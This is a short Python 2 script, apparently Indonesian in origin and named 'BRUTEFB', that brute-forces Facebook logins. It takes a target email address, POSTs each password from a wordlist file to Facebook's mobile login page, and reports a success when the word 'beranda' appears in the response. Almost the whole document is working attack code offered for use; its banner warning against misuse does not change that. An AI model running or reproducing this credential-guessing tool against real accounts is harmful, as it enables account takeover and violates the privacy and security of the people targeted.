import requests
import sys

banner = """

========================================================
	AUTHOR  :  CoDeX01	

	SCRIPT  :  BRUTEFB

		[!] WARNING !! [!]
	HATI-HATI DALAM MENGGUNAKAN SCRIPT INI
	JANGAN DISALAH GUNAKAN,DAN JANGAN
	DIGUNAKAN HANYA UNTUK KEPENTINGAN SENDIRI	
		[!] WARNING !! [!]
========================================================
"""
print banner
email = raw_input("email_> ")
print "Sedang Mengerjakan . . ."

url='https://free.facebook.com/login.php'
ex = open( 'world.txt', 'r' ).readlines()

for line in ex:
	password = line.strip()
	http = requests.post (url, data={ 'email' :email, 'pass' :password, 'login' : 'submit' })
	content = http.content
	
	if  'beranda' in content :
		print "[ + ] Password Found !      |  ", password
		sys.exit(1)
	else :
		print "[-|-] Password NotFound !!!         |  ", password
	
